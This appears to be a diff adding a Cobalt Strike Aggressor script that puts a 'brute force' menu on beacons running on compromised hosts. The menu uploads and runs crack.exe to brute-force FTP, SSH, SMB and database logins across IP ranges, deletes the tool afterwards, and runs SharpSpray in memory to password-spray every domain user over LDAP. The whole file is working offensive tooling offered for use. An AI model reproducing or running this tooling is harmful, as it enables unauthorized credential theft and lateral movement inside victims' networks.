@@ -1,0 +1,72 @@
+##############################
+#                            #
+#                            #
+#                            #
+#       Xway.cn@panda        #
+#                            #
+#                            #
+#                            #
+##############################
+	    menu "暴力破解" {
+			item "上传crack" {
+				$bid = $1;
+				$dialog = dialog("上传crack", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &crack);
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+sub crack {
+
+    bcd($bid, $3['UploadPath']);
+
+        bupload($bid, script_resource("/script/crack.exe"));
+    }
+            item "运行crack"{
+                $bid = $1['@'];
+                $Dialog = dialog("运行crack",%(ip => "192.168.1.1/24，192.168.1-255，192.168.1.1", port => "3389", username => "filename list or username", password => "filename list or password", type => "ssh", thread => "默认线程100",bid => $bid),&crack_run);
+                dialog_description($Dialog, "支持爆破ftp，ssh，smb，mssql，mysql, postgresql,爆破完毕会在当前目录生成result.txt。");
+                drow_text($Dialog, "ip", "ip: ");
+                drow_text($Dialog, "port", "port: ");
+				drow_text($Dialog, "username", "username: ");
+				drow_text($Dialog, "password", "password: ");
+				drow_text($Dialog, "type", "type: ");
+				drow_text($Dialog, "thread", "thread: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+                }
+
+sub crack_run{
+    local('$Name $port $username $password $type $thread');
+    $Name = $3['ip'];
+    $port = replace($3['port'], "\"", "");
+	$username = $3['username'];
+	$password = $3['password'];
+	$type = $3['type'];
+	$thread = $3['thread'];
+	bshell($bid, "crack.exe -i  $+ $Name -p  $+ $port -U  $+ $username -P  $+ $password -s  $+ $type -t  $+ $thread");
+}  
+        	item "删除crack"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q crack.exe");
+        	}
+		}  
+
+
+			item "SharpSpray" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpSpray", %(passwd => "123,888",Delay => "1000",Sleep => "15",bid => $bid), &SharpSpray);
+			dialog_description($dialog, "使用LDAP对域的所有用户执行密码喷雾攻击,seeds指定几个密码生成字典,逗号分隔,passwords指定密码爆破,可多个密码,逗号分隔,delay:密码喷雾的延迟,毫秒为单位,sleep:密码猜测之间sleep周期分钟数");
+			drow_combobox($dialog, "type", "type:", @("--Seeds","--Passwords"));
+			drow_text($dialog, "passwd", "passwd:  ");
+			drow_text($dialog, "Delay", "Delay:  ");
+			drow_text($dialog, "Sleep", "Sleep:  ");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpSpray {
+	$arg = join(' ',  @($3['type'],$3['passwd'],"--Sleep",$3['Sleep'],"--Delay",$3['Delay']));
+	bexecute_assembly($bid, script_resource("/script/SharpSpray.exe"), $arg);
+}
+	  
+	  }
